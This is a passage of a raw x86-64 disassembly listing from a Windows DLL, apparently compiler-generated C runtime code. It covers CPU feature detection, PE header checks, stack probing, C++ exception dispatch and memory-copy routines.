   18000cdce:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   18000cdd5:	33 d2                	xor    %edx,%edx
   18000cdd7:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000cddc:	e8 b3 90 ff ff       	call   0x180005e94
   18000cde1:	83 c8 ff             	or     $0xffffffff,%eax
   18000cde4:	48 83 c4 58          	add    $0x58,%rsp
   18000cde8:	c3                   	ret
   18000cde9:	cc                   	int3
   18000cdea:	cc                   	int3
   18000cdeb:	cc                   	int3
   18000cdec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cdf1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000cdf6:	57                   	push   %rdi
   18000cdf7:	48 83 ec 20          	sub    $0x20,%rsp
   18000cdfb:	48 63 f9             	movslq %ecx,%rdi
   18000cdfe:	48 8b f2             	mov    %rdx,%rsi
   18000ce01:	8b cf                	mov    %edi,%ecx
   18000ce03:	e8 88 ea ff ff       	call   0x18000b890
   18000ce08:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000ce0c:	75 04                	jne    0x18000ce12
   18000ce0e:	33 db                	xor    %ebx,%ebx
   18000ce10:	eb 5a                	jmp    0x18000ce6c
   18000ce12:	48 8b 05 b7 e2 00 00 	mov    0xe2b7(%rip),%rax        # 0x18001b0d0
   18000ce19:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000ce1e:	83 ff 01             	cmp    $0x1,%edi
   18000ce21:	75 09                	jne    0x18000ce2c
   18000ce23:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   18000ce2a:	75 0d                	jne    0x18000ce39
   18000ce2c:	3b f9                	cmp    %ecx,%edi
   18000ce2e:	75 20                	jne    0x18000ce50
   18000ce30:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   18000ce37:	74 17                	je     0x18000ce50
   18000ce39:	e8 52 ea ff ff       	call   0x18000b890
   18000ce3e:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000ce43:	48 8b d8             	mov    %rax,%rbx
   18000ce46:	e8 45 ea ff ff       	call   0x18000b890
   18000ce4b:	48 3b c3             	cmp    %rbx,%rax
   18000ce4e:	74 be                	je     0x18000ce0e
   18000ce50:	8b cf                	mov    %edi,%ecx
   18000ce52:	e8 39 ea ff ff       	call   0x18000b890
   18000ce57:	48 8b c8             	mov    %rax,%rcx
   18000ce5a:	ff 15 d8 23 00 00    	call   *0x23d8(%rip)        # 0x18000f238
   18000ce60:	85 c0                	test   %eax,%eax
   18000ce62:	75 aa                	jne    0x18000ce0e
   18000ce64:	ff 15 06 22 00 00    	call   *0x2206(%rip)        # 0x18000f070
   18000ce6a:	8b d8                	mov    %eax,%ebx
   18000ce6c:	8b cf                	mov    %edi,%ecx
   18000ce6e:	e8 61 e9 ff ff       	call   0x18000b7d4
   18000ce73:	48 8b d7             	mov    %rdi,%rdx
   18000ce76:	4c 8d 05 53 e2 00 00 	lea    0xe253(%rip),%r8        # 0x18001b0d0
   18000ce7d:	83 e2 3f             	and    $0x3f,%edx
   18000ce80:	48 8b cf             	mov    %rdi,%rcx
   18000ce83:	48 c1 f9 06          	sar    $0x6,%rcx
   18000ce87:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000ce8b:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   18000ce8f:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   18000ce94:	85 db                	test   %ebx,%ebx
   18000ce96:	74 0f                	je     0x18000cea7
   18000ce98:	48 8b d6             	mov    %rsi,%rdx
   18000ce9b:	8b cb                	mov    %ebx,%ecx
   18000ce9d:	e8 0a 92 ff ff       	call   0x1800060ac
   18000cea2:	83 c8 ff             	or     $0xffffffff,%eax
   18000cea5:	eb 02                	jmp    0x18000cea9
   18000cea7:	33 c0                	xor    %eax,%eax
   18000cea9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ceae:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000ceb3:	48 83 c4 20          	add    $0x20,%rsp
   18000ceb7:	5f                   	pop    %rdi
   18000ceb8:	c3                   	ret
   18000ceb9:	cc                   	int3
   18000ceba:	cc                   	int3
   18000cebb:	cc                   	int3
   18000cebc:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   18000cec0:	33 c0                	xor    %eax,%eax
   18000cec2:	48 89 01             	mov    %rax,(%rcx)
   18000cec5:	48 89 41 08          	mov    %rax,0x8(%rcx)
   18000cec9:	89 41 10             	mov    %eax,0x10(%rcx)
   18000cecc:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   18000ced0:	48 89 41 28          	mov    %rax,0x28(%rcx)
   18000ced4:	87 41 14             	xchg   %eax,0x14(%rcx)
   18000ced7:	c3                   	ret
   18000ced8:	cc                   	int3
   18000ced9:	cc                   	int3
   18000ceda:	cc                   	int3
   18000cedb:	cc                   	int3
   18000cedc:	cc                   	int3
   18000cedd:	cc                   	int3
   18000cede:	cc                   	int3
   18000cedf:	cc                   	int3
   18000cee0:	40 53                	rex push %rbx
   18000cee2:	48 83 ec 10          	sub    $0x10,%rsp
   18000cee6:	33 c9                	xor    %ecx,%ecx
   18000cee8:	45 33 c0             	xor    %r8d,%r8d
   18000ceeb:	b8 01 00 00 00       	mov    $0x1,%eax
   18000cef0:	44 89 05 55 e6 00 00 	mov    %r8d,0xe655(%rip)        # 0x18001b54c
   18000cef7:	0f a2                	cpuid
   18000cef9:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000cefd:	81 e1 00 10 00 18    	and    $0x18001000,%ecx
   18000cf03:	89 04 24             	mov    %eax,(%rsp)
   18000cf06:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   18000cf0a:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   18000cf0e:	81 f9 00 10 00 18    	cmp    $0x18001000,%ecx
   18000cf14:	75 32                	jne    0x18000cf48
   18000cf16:	33 c9                	xor    %ecx,%ecx
   18000cf18:	0f 01 d0             	xgetbv
   18000cf1b:	48 c1 e2 20          	shl    $0x20,%rdx
   18000cf1f:	48 0b d0             	or     %rax,%rdx
   18000cf22:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   18000cf27:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000cf2c:	24 06                	and    $0x6,%al
   18000cf2e:	3c 06                	cmp    $0x6,%al
   18000cf30:	75 0f                	jne    0x18000cf41
   18000cf32:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000cf38:	44 89 05 0d e6 00 00 	mov    %r8d,0xe60d(%rip)        # 0x18001b54c
   18000cf3f:	eb 07                	jmp    0x18000cf48
   18000cf41:	44 8b 05 04 e6 00 00 	mov    0xe604(%rip),%r8d        # 0x18001b54c
   18000cf48:	33 c0                	xor    %eax,%eax
   18000cf4a:	41 f6 c0 01          	test   $0x1,%r8b
   18000cf4e:	74 35                	je     0x18000cf85
   18000cf50:	33 c9                	xor    %ecx,%ecx
   18000cf52:	0f a2                	cpuid
   18000cf54:	83 f8 07             	cmp    $0x7,%eax
   18000cf57:	7c 2a                	jl     0x18000cf83
   18000cf59:	33 c9                	xor    %ecx,%ecx
   18000cf5b:	b8 07 00 00 00       	mov    $0x7,%eax
   18000cf60:	0f a2                	cpuid
   18000cf62:	33 c0                	xor    %eax,%eax
   18000cf64:	f6 c3 20             	test   $0x20,%bl
   18000cf67:	74 1c                	je     0x18000cf85
   18000cf69:	c7 05 d9 e5 00 00 03 	movl   $0x3,0xe5d9(%rip)        # 0x18001b54c
   18000cf70:	00 00 00 
   18000cf73:	c7 05 cb e5 00 00 03 	movl   $0x3,0xe5cb(%rip)        # 0x18001b548
   18000cf7a:	00 00 00 
   18000cf7d:	48 83 c4 10          	add    $0x10,%rsp
   18000cf81:	5b                   	pop    %rbx
   18000cf82:	c3                   	ret
   18000cf83:	33 c0                	xor    %eax,%eax
   18000cf85:	44 89 05 bc e5 00 00 	mov    %r8d,0xe5bc(%rip)        # 0x18001b548
   18000cf8c:	48 83 c4 10          	add    $0x10,%rsp
   18000cf90:	5b                   	pop    %rbx
   18000cf91:	c3                   	ret
   18000cf92:	cc                   	int3
   18000cf93:	cc                   	int3
   18000cf94:	cc                   	int3
   18000cf95:	cc                   	int3
   18000cf96:	cc                   	int3
   18000cf97:	cc                   	int3
   18000cf98:	cc                   	int3
   18000cf99:	cc                   	int3
   18000cf9a:	cc                   	int3
   18000cf9b:	cc                   	int3
   18000cf9c:	cc                   	int3
   18000cf9d:	cc                   	int3
   18000cf9e:	cc                   	int3
   18000cf9f:	cc                   	int3
   18000cfa0:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   18000cfa4:	45 33 c9             	xor    %r9d,%r9d
   18000cfa7:	4c 03 c1             	add    %rcx,%r8
   18000cfaa:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   18000cfaf:	45 0f b7 50 06       	movzwl 0x6(%r8),%r10d
   18000cfb4:	48 83 c0 18          	add    $0x18,%rax
   18000cfb8:	49 03 c0             	add    %r8,%rax
   18000cfbb:	45 85 d2             	test   %r10d,%r10d
   18000cfbe:	74 20                	je     0x18000cfe0
   18000cfc0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   18000cfc4:	49 3b d0             	cmp    %r8,%rdx
   18000cfc7:	72 0b                	jb     0x18000cfd4
   18000cfc9:	8b 48 08             	mov    0x8(%rax),%ecx
   18000cfcc:	41 03 c8             	add    %r8d,%ecx
   18000cfcf:	48 3b d1             	cmp    %rcx,%rdx
   18000cfd2:	72 0e                	jb     0x18000cfe2
   18000cfd4:	41 ff c1             	inc    %r9d
   18000cfd7:	48 83 c0 28          	add    $0x28,%rax
   18000cfdb:	45 3b ca             	cmp    %r10d,%r9d
   18000cfde:	72 e0                	jb     0x18000cfc0
   18000cfe0:	33 c0                	xor    %eax,%eax
   18000cfe2:	c3                   	ret
   18000cfe3:	cc                   	int3
   18000cfe4:	cc                   	int3
   18000cfe5:	cc                   	int3
   18000cfe6:	cc                   	int3
   18000cfe7:	cc                   	int3
   18000cfe8:	cc                   	int3
   18000cfe9:	cc                   	int3
   18000cfea:	cc                   	int3
   18000cfeb:	cc                   	int3
   18000cfec:	cc                   	int3
   18000cfed:	cc                   	int3
   18000cfee:	cc                   	int3
   18000cfef:	cc                   	int3
   18000cff0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cff5:	57                   	push   %rdi
   18000cff6:	48 83 ec 20          	sub    $0x20,%rsp
   18000cffa:	48 8b d9             	mov    %rcx,%rbx
   18000cffd:	48 8d 3d fc 2f ff ff 	lea    -0xd004(%rip),%rdi        # 0x180000000
   18000d004:	48 8b cf             	mov    %rdi,%rcx
   18000d007:	e8 34 00 00 00       	call   0x18000d040
   18000d00c:	85 c0                	test   %eax,%eax
   18000d00e:	74 1f                	je     0x18000d02f
   18000d010:	48 2b df             	sub    %rdi,%rbx
   18000d013:	48 8b d3             	mov    %rbx,%rdx
   18000d016:	48 8b cf             	mov    %rdi,%rcx
   18000d019:	e8 82 ff ff ff       	call   0x18000cfa0
   18000d01e:	48 85 c0             	test   %rax,%rax
   18000d021:	74 0c                	je     0x18000d02f
   18000d023:	8b 40 24             	mov    0x24(%rax),%eax
   18000d026:	f7 d0                	not    %eax
   18000d028:	c1 e8 1f             	shr    $0x1f,%eax
   18000d02b:	eb 02                	jmp    0x18000d02f
   18000d02d:	33 c0                	xor    %eax,%eax
   18000d02f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000d034:	48 83 c4 20          	add    $0x20,%rsp
   18000d038:	5f                   	pop    %rdi
   18000d039:	c3                   	ret
   18000d03a:	cc                   	int3
   18000d03b:	cc                   	int3
   18000d03c:	cc                   	int3
   18000d03d:	cc                   	int3
   18000d03e:	cc                   	int3
   18000d03f:	cc                   	int3
   18000d040:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   18000d045:	66 39 01             	cmp    %ax,(%rcx)
   18000d048:	75 1e                	jne    0x18000d068
   18000d04a:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   18000d04e:	48 03 d1             	add    %rcx,%rdx
   18000d051:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   18000d057:	75 0f                	jne    0x18000d068
   18000d059:	33 c0                	xor    %eax,%eax
   18000d05b:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   18000d060:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   18000d064:	0f 94 c0             	sete   %al
   18000d067:	c3                   	ret
   18000d068:	33 c0                	xor    %eax,%eax
   18000d06a:	c3                   	ret
   18000d06b:	cc                   	int3
   18000d06c:	cc                   	int3
   18000d06d:	cc                   	int3
   18000d06e:	cc                   	int3
   18000d06f:	cc                   	int3
   18000d070:	40 53                	rex push %rbx
   18000d072:	48 83 ec 20          	sub    $0x20,%rsp
   18000d076:	48 8d 05 7b 97 00 00 	lea    0x977b(%rip),%rax        # 0x1800167f8
   18000d07d:	48 8b d9             	mov    %rcx,%rbx
   18000d080:	48 89 01             	mov    %rax,(%rcx)
   18000d083:	f6 c2 01             	test   $0x1,%dl
   18000d086:	74 0a                	je     0x18000d092
   18000d088:	ba 18 00 00 00       	mov    $0x18,%edx
   18000d08d:	e8 0e 00 00 00       	call   0x18000d0a0
   18000d092:	48 8b c3             	mov    %rbx,%rax
   18000d095:	48 83 c4 20          	add    $0x20,%rsp
   18000d099:	5b                   	pop    %rbx
   18000d09a:	c3                   	ret
   18000d09b:	cc                   	int3
   18000d09c:	cc                   	int3
   18000d09d:	cc                   	int3
   18000d09e:	cc                   	int3
   18000d09f:	cc                   	int3
   18000d0a0:	e9 db 00 00 00       	jmp    0x18000d180
   18000d0a5:	cc                   	int3
   18000d0a6:	cc                   	int3
   18000d0a7:	cc                   	int3
   18000d0a8:	cc                   	int3
   18000d0a9:	cc                   	int3
   18000d0aa:	cc                   	int3
   18000d0ab:	cc                   	int3
   18000d0ac:	cc                   	int3
   18000d0ad:	cc                   	int3
   18000d0ae:	cc                   	int3
   18000d0af:	cc                   	int3
   18000d0b0:	40 53                	rex push %rbx
   18000d0b2:	55                   	push   %rbp
   18000d0b3:	56                   	push   %rsi
   18000d0b4:	57                   	push   %rdi
   18000d0b5:	41 56                	push   %r14
   18000d0b7:	48 83 ec 20          	sub    $0x20,%rsp
   18000d0bb:	49 8b 59 38          	mov    0x38(%r9),%rbx
   18000d0bf:	48 8b f2             	mov    %rdx,%rsi
   18000d0c2:	4d 8b f0             	mov    %r8,%r14
   18000d0c5:	48 8b e9             	mov    %rcx,%rbp
   18000d0c8:	49 8b d1             	mov    %r9,%rdx
   18000d0cb:	48 8b ce             	mov    %rsi,%rcx
   18000d0ce:	49 8b f9             	mov    %r9,%rdi
   18000d0d1:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   18000d0d5:	e8 16 40 ff ff       	call   0x1800010f0
   18000d0da:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   18000d0de:	b8 00 00 00 00       	mov    $0x0,%eax
   18000d0e3:	0f 95 c0             	setne  %al
   18000d0e6:	ff c0                	inc    %eax
   18000d0e8:	85 43 04             	test   %eax,0x4(%rbx)
   18000d0eb:	74 1b                	je     0x18000d108
   18000d0ed:	4c 8b cf             	mov    %rdi,%r9
   18000d0f0:	4d 8b c6             	mov    %r14,%r8
   18000d0f3:	48 8b d6             	mov    %rsi,%rdx
   18000d0f6:	48 8b cd             	mov    %rbp,%rcx
   18000d0f9:	48 83 c4 20          	add    $0x20,%rsp
   18000d0fd:	41 5e                	pop    %r14
   18000d0ff:	5f                   	pop    %rdi
   18000d100:	5e                   	pop    %rsi
   18000d101:	5d                   	pop    %rbp
   18000d102:	5b                   	pop    %rbx
   18000d103:	e9 48 5e ff ff       	jmp    0x180002f50
   18000d108:	b8 01 00 00 00       	mov    $0x1,%eax
   18000d10d:	48 83 c4 20          	add    $0x20,%rsp
   18000d111:	41 5e                	pop    %r14
   18000d113:	5f                   	pop    %rdi
   18000d114:	5e                   	pop    %rsi
   18000d115:	5d                   	pop    %rbp
   18000d116:	5b                   	pop    %rbx
   18000d117:	c3                   	ret
   18000d118:	cc                   	int3
   18000d119:	cc                   	int3
   18000d11a:	cc                   	int3
   18000d11b:	cc                   	int3
   18000d11c:	cc                   	int3
   18000d11d:	cc                   	int3
   18000d11e:	cc                   	int3
   18000d11f:	cc                   	int3
   18000d120:	cc                   	int3
   18000d121:	cc                   	int3
   18000d122:	cc                   	int3
   18000d123:	cc                   	int3
   18000d124:	cc                   	int3
   18000d125:	cc                   	int3
   18000d126:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d12d:	00 00 00 
   18000d130:	48 83 ec 10          	sub    $0x10,%rsp
   18000d134:	4c 89 14 24          	mov    %r10,(%rsp)
   18000d138:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   18000d13d:	4d 33 db             	xor    %r11,%r11
   18000d140:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   18000d145:	4c 2b d0             	sub    %rax,%r10
   18000d148:	4d 0f 42 d3          	cmovb  %r11,%r10
   18000d14c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   18000d153:	00 00 
   18000d155:	4d 3b d3             	cmp    %r11,%r10
   18000d158:	73 16                	jae    0x18000d170
   18000d15a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   18000d160:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   18000d167:	41 c6 03 00          	movb   $0x0,(%r11)
   18000d16b:	4d 3b d3             	cmp    %r11,%r10
   18000d16e:	75 f0                	jne    0x18000d160
   18000d170:	4c 8b 14 24          	mov    (%rsp),%r10
   18000d174:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   18000d179:	48 83 c4 10          	add    $0x10,%rsp
   18000d17d:	c3                   	ret
   18000d17e:	cc                   	int3
   18000d17f:	cc                   	int3
   18000d180:	e9 4b 88 ff ff       	jmp    0x1800059d0
   18000d185:	cc                   	int3
   18000d186:	cc                   	int3
   18000d187:	cc                   	int3
   18000d188:	cc                   	int3
   18000d189:	cc                   	int3
   18000d18a:	cc                   	int3
   18000d18b:	cc                   	int3
   18000d18c:	cc                   	int3
   18000d18d:	cc                   	int3
   18000d18e:	cc                   	int3
   18000d18f:	cc                   	int3
   18000d190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000d195:	57                   	push   %rdi
   18000d196:	48 83 ec 20          	sub    $0x20,%rsp
   18000d19a:	49 8b f8             	mov    %r8,%rdi
   18000d19d:	48 8b d9             	mov    %rcx,%rbx
   18000d1a0:	e8 3b 4e ff ff       	call   0x180001fe0
   18000d1a5:	f6 43 04 66          	testb  $0x66,0x4(%rbx)
   18000d1a9:	75 0d                	jne    0x18000d1b8
   18000d1ab:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   18000d1b1:	75 05                	jne    0x18000d1b8
   18000d1b3:	83 f8 01             	cmp    $0x1,%eax
   18000d1b6:	74 0b                	je     0x18000d1c3
   18000d1b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000d1bd:	48 83 c4 20          	add    $0x20,%rsp
   18000d1c1:	5f                   	pop    %rdi
   18000d1c2:	c3                   	ret
   18000d1c3:	e8 d8 53 ff ff       	call   0x1800025a0
   18000d1c8:	48 89 58 20          	mov    %rbx,0x20(%rax)
   18000d1cc:	e8 cf 53 ff ff       	call   0x1800025a0
   18000d1d1:	48 89 78 28          	mov    %rdi,0x28(%rax)
   18000d1d5:	e8 d6 87 ff ff       	call   0x1800059b0
   18000d1da:	cc                   	int3
   18000d1db:	cc                   	int3
   18000d1dc:	cc                   	int3
   18000d1dd:	cc                   	int3
   18000d1de:	cc                   	int3
   18000d1df:	cc                   	int3
   18000d1e0:	cc                   	int3
   18000d1e1:	cc                   	int3
   18000d1e2:	cc                   	int3
   18000d1e3:	cc                   	int3
   18000d1e4:	cc                   	int3
   18000d1e5:	cc                   	int3
   18000d1e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d1ed:	00 00 00 
   18000d1f0:	ff e0                	jmp    *%rax
   18000d1f2:	cc                   	int3
   18000d1f3:	cc                   	int3
   18000d1f4:	cc                   	int3
   18000d1f5:	cc                   	int3
   18000d1f6:	cc                   	int3
   18000d1f7:	cc                   	int3
   18000d1f8:	cc                   	int3
   18000d1f9:	cc                   	int3
   18000d1fa:	cc                   	int3
   18000d1fb:	cc                   	int3
   18000d1fc:	cc                   	int3
   18000d1fd:	cc                   	int3
   18000d1fe:	cc                   	int3
   18000d1ff:	cc                   	int3
   18000d200:	cc                   	int3
   18000d201:	cc                   	int3
   18000d202:	cc                   	int3
   18000d203:	cc                   	int3
   18000d204:	cc                   	int3
   18000d205:	cc                   	int3
   18000d206:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d20d:	00 00 00 
   18000d210:	ff 25 42 20 00 00    	jmp    *0x2042(%rip)        # 0x18000f258
   18000d216:	cc                   	int3
   18000d217:	cc                   	int3
   18000d218:	cc                   	int3
   18000d219:	cc                   	int3
   18000d21a:	cc                   	int3
   18000d21b:	cc                   	int3
   18000d21c:	cc                   	int3
   18000d21d:	cc                   	int3
   18000d21e:	cc                   	int3
   18000d21f:	cc                   	int3
   18000d220:	cc                   	int3
   18000d221:	cc                   	int3
   18000d222:	cc                   	int3
   18000d223:	cc                   	int3
   18000d224:	cc                   	int3
   18000d225:	cc                   	int3
   18000d226:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d22d:	00 00 00 
   18000d230:	ff 25 22 20 00 00    	jmp    *0x2022(%rip)        # 0x18000f258
   18000d236:	cc                   	int3
   18000d237:	cc                   	int3
   18000d238:	cc                   	int3
   18000d239:	cc                   	int3
   18000d23a:	cc                   	int3
   18000d23b:	cc                   	int3
   18000d23c:	cc                   	int3
   18000d23d:	cc                   	int3
   18000d23e:	cc                   	int3
   18000d23f:	cc                   	int3
   18000d240:	cc                   	int3
   18000d241:	cc                   	int3
   18000d242:	cc                   	int3
   18000d243:	cc                   	int3
   18000d244:	cc                   	int3
   18000d245:	cc                   	int3
   18000d246:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d24d:	00 00 00 
   18000d250:	cc                   	int3
   18000d251:	cc                   	int3
   18000d252:	cc                   	int3
   18000d253:	cc                   	int3
   18000d254:	cc                   	int3
   18000d255:	cc                   	int3
   18000d256:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d25d:	00 00 00 
   18000d260:	57                   	push   %rdi
   18000d261:	56                   	push   %rsi
   18000d262:	48 8b f9             	mov    %rcx,%rdi
   18000d265:	48 8b f2             	mov    %rdx,%rsi
   18000d268:	49 8b c8             	mov    %r8,%rcx
   18000d26b:	f3 a4                	rep movsb (%rsi),(%rdi)
   18000d26d:	5e                   	pop    %rsi
   18000d26e:	5f                   	pop    %rdi
   18000d26f:	c3                   	ret
   18000d270:	48 8b c1             	mov    %rcx,%rax
   18000d273:	4c 8d 15 86 2d ff ff 	lea    -0xd27a(%rip),%r10        # 0x180000000
   18000d27a:	49 83 f8 0f          	cmp    $0xf,%r8
   18000d27e:	0f 87 0c 01 00 00    	ja     0x18000d390
   18000d284:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000d28b:	00 00 00 00 00 
   18000d290:	47 8b 8c 82 60 69 01 	mov    0x16960(%r10,%r8,4),%r9d
   18000d297:	00 
   18000d298:	4d 03 ca             	add    %r10,%r9
   18000d29b:	41 ff e1             	jmp    *%r9
   18000d29e:	c3                   	ret
   18000d29f:	90                   	nop
   18000d2a0:	4c 8b 02             	mov    (%rdx),%r8
   18000d2a3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   18000d2a6:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   18000d2ab:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   18000d2b0:	4c 89 00             	mov    %r8,(%rax)
   18000d2b3:	89 48 08             	mov    %ecx,0x8(%rax)
   18000d2b6:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   18000d2bb:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   18000d2bf:	c3                   	ret
   18000d2c0:	4c 8b 02             	mov    (%rdx),%r8
   18000d2c3:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   18000d2c7:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   18000d2cc:	4c 89 00             	mov    %r8,(%rax)
   18000d2cf:	66 89 48 08          	mov    %cx,0x8(%rax)
   18000d2d3:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   18000d2d7:	c3                   	ret
   18000d2d8:	0f b7 0a             	movzwl (%rdx),%ecx
   18000d2db:	66 89 08             	mov    %cx,(%rax)
   18000d2de:	c3                   	ret
   18000d2df:	90                   	nop
   18000d2e0:	8b 0a                	mov    (%rdx),%ecx
   18000d2e2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   18000d2e7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   18000d2ec:	89 08                	mov    %ecx,(%rax)
   18000d2ee:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   18000d2f3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   18000d2f7:	c3                   	ret
   18000d2f8:	4c 8b 02             	mov    (%rdx),%r8
   18000d2fb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   18000d2fe:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   18000d303:	4c 89 00             	mov    %r8,(%rax)
   18000d306:	89 48 08             	mov    %ecx,0x8(%rax)
   18000d309:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   18000d30e:	c3                   	ret
   18000d30f:	0f b7 0a             	movzwl (%rdx),%ecx
   18000d312:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   18000d317:	66 89 08             	mov    %cx,(%rax)
   18000d31a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   18000d31e:	c3                   	ret
   18000d31f:	90                   	nop
   18000d320:	4c 8b 02             	mov    (%rdx),%r8
   18000d323:	8b 4a 08             	mov    0x8(%rdx),%ecx
   18000d326:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   18000d32b:	4c 89 00             	mov    %r8,(%rax)
   18000d32e:	89 48 08             	mov    %ecx,0x8(%rax)
   18000d331:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   18000d335:	c3                   	ret
   18000d336:	4c 8b 02             	mov    (%rdx),%r8
   18000d339:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   18000d33d:	4c 89 00             	mov    %r8,(%rax)
   18000d340:	66 89 48 08          	mov    %cx,0x8(%rax)
   18000d344:	c3                   	ret
   18000d345:	4c 8b 02             	mov    (%rdx),%r8
   18000d348:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   18000d34c:	4c 89 00             	mov    %r8,(%rax)
   18000d34f:	88 48 08             	mov    %cl,0x8(%rax)
   18000d352:	c3                   	ret
   18000d353:	4c 8b 02             	mov    (%rdx),%r8
   18000d356:	8b 4a 08             	mov    0x8(%rdx),%ecx
   18000d359:	4c 89 00             	mov    %r8,(%rax)
   18000d35c:	89 48 08             	mov    %ecx,0x8(%rax)
   18000d35f:	c3                   	ret
   18000d360:	8b 0a                	mov    (%rdx),%ecx
   18000d362:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   18000d367:	89 08                	mov    %ecx,(%rax)
   18000d369:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   18000d36e:	c3                   	ret
   18000d36f:	8b 0a                	mov    (%rdx),%ecx
   18000d371:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   18000d376:	89 08                	mov    %ecx,(%rax)
   18000d378:	44 88 40 04          	mov    %r8b,0x4(%rax)
   18000d37c:	c3                   	ret
   18000d37d:	48 8b 0a             	mov    (%rdx),%rcx
   18000d380:	48 89 08             	mov    %rcx,(%rax)
   18000d383:	c3                   	ret
   18000d384:	0f b6 0a             	movzbl (%rdx),%ecx
   18000d387:	88 08                	mov    %cl,(%rax)
   18000d389:	c3                   	ret
   18000d38a:	8b 0a                	mov    (%rdx),%ecx
   18000d38c:	89 08                	mov    %ecx,(%rax)
   18000d38e:	c3                   	ret
   18000d38f:	90                   	nop
   18000d390:	49 83 f8 20          	cmp    $0x20,%r8
   18000d394:	77 17                	ja     0x18000d3ad
   18000d396:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   18000d39a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   18000d3a1:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   18000d3a5:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   18000d3ac:	c3                   	ret
   18000d3ad:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   18000d3b1:	48 3b ca             	cmp    %rdx,%rcx
   18000d3b4:	4c 0f 46 c9          	cmovbe %rcx,%r9
   18000d3b8:	49 3b c9             	cmp    %r9,%rcx
   18000d3bb:	0f 82 4f 04 00 00    	jb     0x18000d810
   18000d3c1:	83 3d 88 cc 00 00 03 	cmpl   $0x3,0xcc88(%rip)        # 0x18001a050
   18000d3c8:	0f 82 f2 02 00 00    	jb     0x18000d6c0
   18000d3ce:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   18000d3d5:	76 26                	jbe    0x18000d3fd
